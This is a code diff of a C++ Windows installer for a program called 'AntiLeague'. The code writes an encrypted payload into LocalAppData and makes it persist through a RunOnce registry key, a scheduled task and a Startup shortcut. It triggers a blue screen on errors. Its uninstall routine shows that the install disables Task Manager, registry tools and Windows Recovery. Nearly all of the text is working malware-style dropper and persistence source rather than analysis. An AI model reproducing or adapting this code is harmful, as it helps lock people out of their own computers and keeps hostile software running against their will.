@@ -1,31 +1,25 @@
+#include "stdafx.h"
 #include "Install.h"
 #include "payload.h"
-#include <io.h>
-#include <codecvt>
-#include <fstream>
-#include <comdef.h>
-#include <filesystem>
-#include <taskschd.h>
-#include <ShlObj_core.h>
 
-std::string c_Install::getInstallPath()
+std::string Installer::getInstallPath()
 {
-    wchar_t _localAppData[MAX_PATH] = { NULL };
-    SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, _localAppData);
+    wchar_t localAppData[MAX_PATH] = { NULL };
+    SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, localAppData);
 
-    if (_localAppData[0] == NULL)
+    if (localAppData[0] == NULL)
     {
         BSOD();
-        std::exit(1);
+        exit(1);
     }
 
     namespace FS = std::filesystem;
 
-    for (auto& itr : FS::directory_iterator(_localAppData))
+    for (auto& itr : FS::directory_iterator(localAppData))
     {
         //Testing for access privileges
         std::error_code ec;
-        FS::directory_iterator _localDir(itr.path(), ec);
+        FS::directory_iterator localDir(itr.path(), ec);
         std::string path = itr.path().string();
 
         if (ec)
@@ -52,14 +46,14 @@ std::string c_Install::getInstallPath()
             path += dec_key;
 
             outfile.open(path, std::ios::binary);
-            outfile << *payload;
+            outfile << payload;
             outfile.close();
 
             return itr.path().string() + "\\AntiLeague.exe";
         }
         else
         {
-            for (auto& it : _localDir)
+            for (auto& it : localDir)
             {
                 if (it.path().wstring().find(L"AntiLeague - ") != std::wstring::npos)
                 {
@@ -72,17 +66,19 @@ std::string c_Install::getInstallPath()
             path += dec_key;
 
             std::ofstream outfile(path, std::ios::binary);
-            outfile << *payload;
+            outfile << payload;
             outfile.close();
 
             return itr.path().string() + "\\AntiLeague.exe";
         }
     }
+
+    return std::string();
 }
 
-void c_Install::Install()
+void Installer::Install()
 {
-	std::string _Install = getInstallPath();
+	std::string installPath = getInstallPath();
 
 #if defined(DisableTaskMGR) || defined(DisableRegistry) || defined(RunOnceRegistry)
     HKEY hkey;
@@ -125,20 +121,39 @@ void c_Install::Install()
 #ifdef RunOnceRegistry
     if (RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", NULL, NULL, NULL, KEY_SET_VALUE, NULL, &hkey, NULL) == ERROR_SUCCESS)
     {
-        _Install.insert(0, "\"");
-        _Install += "\"";
+        installPath.insert(0, "\"");
+        installPath += "\"";
 
-        RegSetValueExA(hkey, "*AntiLeague", NULL, REG_SZ, (LPBYTE)(_Install.c_str()), (_Install.size() + 1) * sizeof(wchar_t));
+        RegSetValueExA(hkey, "*AntiLeague", NULL, REG_SZ, (LPBYTE)(installPath.c_str()), (installPath.size() + 1) * sizeof(wchar_t));
         RegCloseKey(hkey);
     }
 #endif
 
 #ifdef TaskSchedulerStartup
-    CoInitializeEx(NULL, COINIT_MULTITHREADED);
-    CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, NULL, NULL);
+    HRESULT hres = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+
+    if (FAILED(hres))
+    {
+        BSOD();
+        exit(1);
+    }
+
+    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, NULL, NULL);
+
+    if (FAILED(hres))
+    {
+        BSOD();
+        exit(1);
+    }
 
     ITaskService* pService = NULL;
-    CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
+    hres = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
+
+    if (FAILED(hres))
+    {
+        BSOD();
+        exit(1);
+    }
 
     pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
 
@@ -197,11 +212,11 @@ void c_Install::Install()
     pAction->Release();
 
 #ifdef RunOnceRegistry
-    pExecAction->put_Path(_bstr_t(_Install.c_str()));
+    pExecAction->put_Path(_bstr_t(installPath.c_str()));
 #else
-    _Install.insert(0, "\"");
-    _Install += "\"";
-    pExecAction->put_Path(_bstr_t(_Install.c_str()));
+    installPath.insert(0, "\"");
+    installPath += "\"";
+    pExecAction->put_Path(_bstr_t(installPath.c_str()));
 #endif
     pExecAction->Release();
 
@@ -215,34 +230,152 @@ void c_Install::Install()
 #endif
 
 #ifdef StartupFile
-    wchar_t _startup[MAX_PATH];
-    SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, _startup);
+    wchar_t startup[MAX_PATH];
+    SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, startup);
 
-    if (_startup[0] == NULL)
+    if (startup[0] == NULL)
     {
         BSOD();
-        std::exit(1);
+        exit(1);
     }
 
     std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
-    std::wstring _wideInstall = converter.from_bytes(_Install);
+    std::wstring installPathW = converter.from_bytes(installPath);
 
 	IShellLink* psl;
-	CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
+	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
+
+    if (FAILED(hres))
+    {
+        BSOD();
+        exit(1);
+    }
 
 	IPersistFile* ppf;
 	psl->QueryInterface(IID_IPersistFile, (void**)&ppf);
 
 	psl->Resolve(NULL, 0);
-	psl->SetPath((LPCWSTR)_wideInstall.c_str());
-	psl->SetWorkingDirectory((LPCWSTR)_wideInstall.erase(_wideInstall.find_last_of(L"\\/")).c_str());
+	psl->SetPath((LPCWSTR)installPathW.c_str());
+	psl->SetWorkingDirectory((LPCWSTR)installPathW.erase(installPathW.find_last_of(L"\\/")).c_str());
 	psl->SetArguments(NULL);
 	psl->SetDescription(L"AntiLeague");
 
-	std::wstring linkFile = (std::wstring)_startup + L"\\AntiLeague.lnk";
+	std::wstring linkFile = (std::wstring)startup + L"\\AntiLeague.lnk";
 	ppf->Save((LPCWSTR)linkFile.c_str(), TRUE);
 
 	ppf->Release();
 	psl->Release();
 #endif
+}
+
+void Installer::Uninstall()
+{
+#ifdef DisableWinRE
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    ZeroMemory(&si, sizeof(si));
+    ZeroMemory(&pi, sizeof(pi));
+
+    wchar_t args[17] = L"reagentc /enable";
+    if (CreateProcess(NULL, args, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+    {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+#endif
+
+#if defined(DisableTaskMGR) || defined(DisableRegistry) || defined(RunOnceRegistry)
+    HKEY hkey;
+#endif
+
+#ifdef DisableTaskMGR
+    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", NULL, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS)
+    {
+        DWORD value = NULL;
+        RegSetValueEx(hkey, L"DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(value));
+        RegCloseKey(hkey);
+    }
+#endif
+
+#ifdef DisableRegistry
+    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", NULL, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS)
+    {
+        DWORD value = NULL;
+        RegSetValueEx(hkey, L"DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(value));
+        RegCloseKey(hkey);
+    }
+#endif
+
+#ifdef RunOnceRegistry
+    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", NULL, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS)
+    {
+        RegDeleteValue(hkey, L"*AntiLeague");
+        RegCloseKey(hkey);
+    }
+#endif
+
+#ifdef TaskSchedulerStartup
+
+#pragma warning( push )
+#pragma warning( disable : 6031 )
+
+    /*
+        Would rather crash here with no success message to signify failed uninstall
+
+        It would be preferable to create a MessageBox; however, I can't be bothered
+        to get a valid hWnd. That is required because this module isn't registered.
+    */
+    CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, NULL, NULL);
+
+    ITaskService* pService = NULL;
+    CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
+
+#pragma warning( pop ) 
+
+    pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
+
+    ITaskFolder* pRootFolder = NULL;
+    pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
+    pService->Release();
+
+    pRootFolder->DeleteTask(_bstr_t(L"AntiLeague"), NULL);
+    pRootFolder->Release();
+    CoUninitialize();
+#endif
+
+#ifdef StartupFile
+    wchar_t startup[MAX_PATH];
+    SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, startup);
+
+    if (startup[0] == NULL)
+    {
+        MessageBox(NULL, L"Failed to retreive startup path.", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
+        exit(1);
+    }
+
+    std::wstring linkFile = startup;
+    linkFile += L"\\AntiLeague.lnk";
+
+    _wunlink(linkFile.c_str());
+#endif
+}
+
+extern "C"
+{
+    void QuickInstall(const std::string& payload, const std::string& dec_key)
+    {
+        Installer Installer(payload, dec_key);
+        Installer.Install();
+
+        if (!isFirstInstance)
+        {
+            BSOD();
+            exit(1);
+        }
+        else
+            isFirstInstance = false;
+    }
 }
